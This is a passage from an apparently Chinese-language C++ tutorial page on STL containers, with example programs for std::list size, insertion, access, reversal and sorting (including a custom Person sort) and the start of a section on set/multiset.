class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	list&lt;<span class="type">int</span>&gt;L1;</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">	list&lt;<span class="type">int</span>&gt;L2;</span><br><span class="line">	L<span class="number">2.</span><span class="built_in">assign</span>(<span class="number">10</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;交换前： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">printList</span>(L1);</span><br><span class="line">	<span class="built_in">printList</span>(L2);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	L<span class="number">1.</span><span class="built_in">swap</span>(L2);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;交换后： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">printList</span>(L1);</span><br><span class="line">	<span class="built_in">printList</span>(L2);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：list赋值和交换操作能够灵活运用即可</p>
<h4 id="3-7-4-list-大小操作"><a href="#3-7-4-list-大小操作" class="headerlink" title="3.7.4 list 大小操作"></a>3.7.4 list 大小操作</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对list容器的大小进行操作</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>size(); </code>                             &#x2F;&#x2F;返回容器中元素的个数</p>
</li>
<li><p><code>empty(); </code>                           &#x2F;&#x2F;判断容器是否为空</p>
</li>
<li><p><code>resize(num);</code>                   &#x2F;&#x2F;重新指定容器的长度为num，若容器变长，则以默认值填充新位置。</p>
<p>​					    &#x2F;&#x2F;如果容器变短，则末尾超出容器长度的元素被删除。</p>
</li>
<li><p><code>resize(num, elem); </code>       &#x2F;&#x2F;重新指定容器的长度为num，若容器变长，则以elem值填充新位置。</p>
<pre><code>               						    //如果容器变短，则末尾超出容器长度的元素被删除。
</code></pre>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printList</span><span class="params">(<span class="type">const</span> list&lt;<span class="type">int</span>&gt;&amp; L)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (list&lt;<span class="type">int</span>&gt;::const_iterator it = L.<span class="built_in">begin</span>(); it != L.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//大小操作</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	list&lt;<span class="type">int</span>&gt;L1;</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (L<span class="number">1.</span><span class="built_in">empty</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;L1为空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;L1不为空&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;L1的大小为： &quot;</span> &lt;&lt; L<span class="number">1.</span><span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//重新指定大小</span></span><br><span class="line">	L<span class="number">1.</span><span class="built_in">resize</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="built_in">printList</span>(L1);</span><br><span class="line"></span><br><span class="line">	L<span class="number">1.</span><span class="built_in">resize</span>(<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printList</span>(L1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>判断是否为空   — empty</li>
<li>返回元素个数   — size</li>
<li>重新指定个数   — resize</li>
</ul>
<h4 id="3-7-5-list-插入和删除"><a href="#3-7-5-list-插入和删除" class="headerlink" title="3.7.5 list 插入和删除"></a>3.7.5 list 插入和删除</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对list容器进行数据的插入和删除</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li>push_back(elem);&#x2F;&#x2F;在容器尾部加入一个元素</li>
<li>pop_back();&#x2F;&#x2F;删除容器中最后一个元素</li>
<li>push_front(elem);&#x2F;&#x2F;在容器开头插入一个元素</li>
<li>pop_front();&#x2F;&#x2F;从容器开头移除第一个元素</li>
<li>insert(pos,elem);&#x2F;&#x2F;在pos位置插elem元素的拷贝，返回新数据的位置。</li>
<li>insert(pos,n,elem);&#x2F;&#x2F;在pos位置插入n个elem数据，无返回值。</li>
<li>insert(pos,beg,end);&#x2F;&#x2F;在pos位置插入[beg,end)区间的数据，无返回值。</li>
<li>clear();&#x2F;&#x2F;移除容器的所有数据</li>
<li>erase(beg,end);&#x2F;&#x2F;删除[beg,end)区间的数据，返回下一个数据的位置。</li>
<li>erase(pos);&#x2F;&#x2F;删除pos位置的数据，返回下一个数据的位置。</li>
<li>remove(elem);&#x2F;&#x2F;删除容器中所有与elem值匹配的元素。</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printList</span><span class="params">(<span class="type">const</span> list&lt;<span class="type">int</span>&gt;&amp; L)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (list&lt;<span class="type">int</span>&gt;::const_iterator it = L.<span class="built_in">begin</span>(); it != L.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入和删除</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	list&lt;<span class="type">int</span>&gt; L;</span><br><span class="line">	<span class="comment">//尾插</span></span><br><span class="line">	L.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	L.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	L.<span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	<span class="comment">//头插</span></span><br><span class="line">	L.<span class="built_in">push_front</span>(<span class="number">100</span>);</span><br><span class="line">	L.<span class="built_in">push_front</span>(<span class="number">200</span>);</span><br><span class="line">	L.<span class="built_in">push_front</span>(<span class="number">300</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printList</span>(L);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//尾删</span></span><br><span class="line">	L.<span class="built_in">pop_back</span>();</span><br><span class="line">	<span class="built_in">printList</span>(L);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//头删</span></span><br><span class="line">	L.<span class="built_in">pop_front</span>();</span><br><span class="line">	<span class="built_in">printList</span>(L);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//插入</span></span><br><span class="line">	list&lt;<span class="type">int</span>&gt;::iterator it = L.<span class="built_in">begin</span>();</span><br><span class="line">	L.<span class="built_in">insert</span>(++it, <span class="number">1000</span>);</span><br><span class="line">	<span class="built_in">printList</span>(L);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//删除</span></span><br><span class="line">	it = L.<span class="built_in">begin</span>();</span><br><span class="line">	L.<span class="built_in">erase</span>(++it);</span><br><span class="line">	<span class="built_in">printList</span>(L);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//移除</span></span><br><span class="line">	L.<span class="built_in">push_back</span>(<span class="number">10000</span>);</span><br><span class="line">	L.<span class="built_in">push_back</span>(<span class="number">10000</span>);</span><br><span class="line">	L.<span class="built_in">push_back</span>(<span class="number">10000</span>);</span><br><span class="line">	<span class="built_in">printList</span>(L);</span><br><span class="line">	L.<span class="built_in">remove</span>(<span class="number">10000</span>);</span><br><span class="line">	<span class="built_in">printList</span>(L);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//清空</span></span><br><span class="line">	L.<span class="built_in">clear</span>();</span><br><span class="line">	<span class="built_in">printList</span>(L);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>尾插   — push_back</li>
<li>尾删   — pop_back</li>
<li>头插   — push_front</li>
<li>头删   — pop_front</li>
<li>插入   — insert</li>
<li>删除   — erase</li>
<li>移除   — remove</li>
<li>清空   — clear</li>
</ul>
<h4 id="3-7-6-list-数据存取"><a href="#3-7-6-list-数据存取" class="headerlink" title="3.7.6 list 数据存取"></a>3.7.6 list 数据存取</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对list容器中数据进行存取</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>front();</code>        &#x2F;&#x2F;返回第一个元素。</li>
<li><code>back();</code>         &#x2F;&#x2F;返回最后一个元素。</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//数据存取</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	list&lt;<span class="type">int</span>&gt;L1;</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	L<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//cout &lt;&lt; L1.at(0) &lt;&lt; endl;//错误 不支持at访问数据</span></span><br><span class="line">	<span class="comment">//cout &lt;&lt; L1[0] &lt;&lt; endl; //错误  不支持[]方式访问数据</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;第一个元素为： &quot;</span> &lt;&lt; L<span class="number">1.f</span>ront() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;最后一个元素为： &quot;</span> &lt;&lt; L<span class="number">1.</span><span class="built_in">back</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//list容器的迭代器是双向迭代器，不支持随机访问</span></span><br><span class="line">	list&lt;<span class="type">int</span>&gt;::iterator it = L<span class="number">1.</span><span class="built_in">begin</span>();</span><br><span class="line">	<span class="comment">//it = it + 1;//错误，不可以跳跃访问，即使是+1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>list容器中不可以通过[]或者at方式访问数据</li>
<li>返回第一个元素   — front</li>
<li>返回最后一个元素   — back</li>
</ul>
<h4 id="3-7-7-list-反转和排序"><a href="#3-7-7-list-反转和排序" class="headerlink" title="3.7.7 list 反转和排序"></a>3.7.7 list 反转和排序</h4><p><strong>功能描述：</strong></p>
<ul>
<li>将容器中的元素反转，以及将容器中的数据进行排序</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>reverse();</code>   &#x2F;&#x2F;反转链表</li>
<li><code>sort();</code>        &#x2F;&#x2F;链表排序</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">printList</span><span class="params">(<span class="type">const</span> list&lt;<span class="type">int</span>&gt;&amp; L)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (list&lt;<span class="type">int</span>&gt;::const_iterator it = L.<span class="built_in">begin</span>(); it != L.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">myCompare</span><span class="params">(<span class="type">int</span> val1 , <span class="type">int</span> val2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> val1 &gt; val2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//反转和排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	list&lt;<span class="type">int</span>&gt; L;</span><br><span class="line">	L.<span class="built_in">push_back</span>(<span class="number">90</span>);</span><br><span class="line">	L.<span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	L.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	L.<span class="built_in">push_back</span>(<span class="number">70</span>);</span><br><span class="line">	<span class="built_in">printList</span>(L);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//反转容器的元素</span></span><br><span class="line">	L.<span class="built_in">reverse</span>();</span><br><span class="line">	<span class="built_in">printList</span>(L);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//排序</span></span><br><span class="line">	L.<span class="built_in">sort</span>(); <span class="comment">//默认的排序规则 从小到大</span></span><br><span class="line">	<span class="built_in">printList</span>(L);</span><br><span class="line"></span><br><span class="line">	L.<span class="built_in">sort</span>(myCompare); <span class="comment">//指定规则，从大到小</span></span><br><span class="line">	<span class="built_in">printList</span>(L);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>反转   — reverse</li>
<li>排序   — sort （成员函数）</li>
</ul>
<h4 id="3-7-8-排序案例"><a href="#3-7-8-排序案例" class="headerlink" title="3.7.8 排序案例"></a>3.7.8 排序案例</h4><p>案例描述：将Person自定义数据类型进行排序，Person中属性有姓名、年龄、身高</p>
<p>排序规则：按照年龄进行升序，如果年龄相同按照身高进行降序</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> age , <span class="type">int</span> height) &#123;</span><br><span class="line">		m_Name = name;</span><br><span class="line">		m_Age = age;</span><br><span class="line">		m_Height = height;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_Name;  <span class="comment">//姓名</span></span><br><span class="line">	<span class="type">int</span> m_Age;      <span class="comment">//年龄</span></span><br><span class="line">	<span class="type">int</span> m_Height;   <span class="comment">//身高</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ComparePerson</span><span class="params">(Person&amp; p1, Person&amp; p2)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (p<span class="number">1.</span>m_Age == p<span class="number">2.</span>m_Age) &#123;</span><br><span class="line">		<span class="keyword">return</span> p<span class="number">1.</span>m_Height  &gt; p<span class="number">2.</span>m_Height;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>  p<span class="number">1.</span>m_Age &lt; p<span class="number">2.</span>m_Age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	list&lt;Person&gt; L;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="string">&quot;刘备&quot;</span>, <span class="number">35</span> , <span class="number">175</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="string">&quot;曹操&quot;</span>, <span class="number">45</span> , <span class="number">180</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(<span class="string">&quot;孙权&quot;</span>, <span class="number">40</span> , <span class="number">170</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p4</span><span class="params">(<span class="string">&quot;赵云&quot;</span>, <span class="number">25</span> , <span class="number">190</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p5</span><span class="params">(<span class="string">&quot;张飞&quot;</span>, <span class="number">35</span> , <span class="number">160</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p6</span><span class="params">(<span class="string">&quot;关羽&quot;</span>, <span class="number">35</span> , <span class="number">200</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	L.<span class="built_in">push_back</span>(p1);</span><br><span class="line">	L.<span class="built_in">push_back</span>(p2);</span><br><span class="line">	L.<span class="built_in">push_back</span>(p3);</span><br><span class="line">	L.<span class="built_in">push_back</span>(p4);</span><br><span class="line">	L.<span class="built_in">push_back</span>(p5);</span><br><span class="line">	L.<span class="built_in">push_back</span>(p6);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (list&lt;Person&gt;::iterator it = L.<span class="built_in">begin</span>(); it != L.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; it-&gt;m_Name &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; it-&gt;m_Age </span><br><span class="line">              &lt;&lt; <span class="string">&quot; 身高： &quot;</span> &lt;&lt; it-&gt;m_Height &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;---------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">	L.<span class="built_in">sort</span>(ComparePerson); <span class="comment">//排序</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (list&lt;Person&gt;::iterator it = L.<span class="built_in">begin</span>(); it != L.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; it-&gt;m_Name &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; it-&gt;m_Age </span><br><span class="line">              &lt;&lt; <span class="string">&quot; 身高： &quot;</span> &lt;&lt; it-&gt;m_Height &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>总结：</p>
<ul>
<li><p>对于自定义数据类型，必须要指定排序规则，否则编译器不知道如何进行排序</p>
</li>
<li><p>高级排序只是在排序规则上再进行一次逻辑规则制定，并不复杂</p>
</li>
</ul>
<h3 id="3-8-set-multiset-容器"><a href="#3-8-set-multiset-容器" class="headerlink" title="3.8 set&#x2F; multiset 容器"></a>3.8 set&#x2F; multiset 容器</h3><h4 id="3-8-1-set基本概念"><a href="#3-8-1-set基本概念" class="headerlink" title="3.8.1 set基本概念"></a>3.8.1 set基本概念</h4><p><strong>简介：</strong></p>
<ul>
<li>所有元素都会在插入时自动被排序</li>
</ul>
<p><strong>本质：</strong></p>
<ul>
<li>set&#x2F;multiset属于<strong>关联式容器</strong>，底层结构是用<strong>二叉树</strong>实现。</li>
</ul>
<p><strong>set和multiset区别</strong>：</p>
<ul>
<li>set不允许容器中有重复的元素</li>
<li>multiset允许容器中有重复的元素</li>
</ul>
<h4 id="3-8-2-set构造和赋值"><a href="#3-8-2-set构造和赋值" class="headerlink" title="3.8.2 set构造和赋值"></a>3.8.2 set构造和赋值</h4><p>功能描述：创建set容器以及赋值</p>
<p>构造：</p>
<ul>
<li><code>set&lt;T&gt; st;</code>                        &#x2F;&#x2F;默认构造函数：</li>
<li><code>set(const set &amp;st);</code>       &#x2F;&#x2F;拷贝构造函数</li>
</ul>
<p>赋值：</p>
<ul>
<li><code>set&amp; operator=(const set &amp;st);</code>    &#x2F;&#x2F;重载等号操作符</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printSet</span><span class="params">(set&lt;<span class="type">int</span>&gt; &amp; s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (set&lt;<span class="type">int</span>&gt;::iterator it = s.<span class="built_in">begin</span>(); it != s.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造和赋值</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	set&lt;<span class="type">int</span>&gt; s1;</span><br><span class="line"></span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">30</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">20</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">40</span>);</span><br><span class="line">	<span class="built_in">printSet</span>(s1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//拷贝构造</span></span><br><span class="line">	set&lt;<span class="type">int</span>&gt;<span class="built_in">s2</span>(s1);</span><br><span class="line">	<span class="built_in">printSet</span>(s2);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//赋值</span></span><br><span class="line">	set&lt;<span class="type">int</span>&gt;s3;</span><br><span class="line">	s3 = s2;</span><br><span class="line">	<span class="built_in">printSet</span>(s3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>set容器插入数据时用insert</li>
<li>set容器插入数据的数据会自动排序</li>
</ul>
<h4 id="3-8-3-set大小和交换"><a href="#3-8-3-set大小和交换" class="headerlink" title="3.8.3 set大小和交换"></a>3.8.3 set大小和交换</h4><p><strong>功能描述：</strong></p>
<ul>
<li>统计set容器大小以及交换set容器</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>size();</code>          &#x2F;&#x2F;返回容器中元素的数目</li>
<li><code>empty();</code>        &#x2F;&#x2F;判断容器是否为空</li>
<li><code>swap(st);</code>      &#x2F;&#x2F;交换两个集合容器</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printSet</span><span class="params">(set&lt;<span class="type">int</span>&gt; &amp; s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (set&lt;<span class="type">int</span>&gt;::iterator it = s.<span class="built_in">begin</span>(); it != s.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//大小</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	set&lt;<span class="type">int</span>&gt; s1;</span><br><span class="line">	</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">30</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">20</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s<span class="number">1.</span><span class="built_in">empty</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;s1为空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;s1不为空&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;s1的大小为： &quot;</span> &lt;&lt; s<span class="number">1.</span><span class="built_in">size</span>() &lt;&lt; 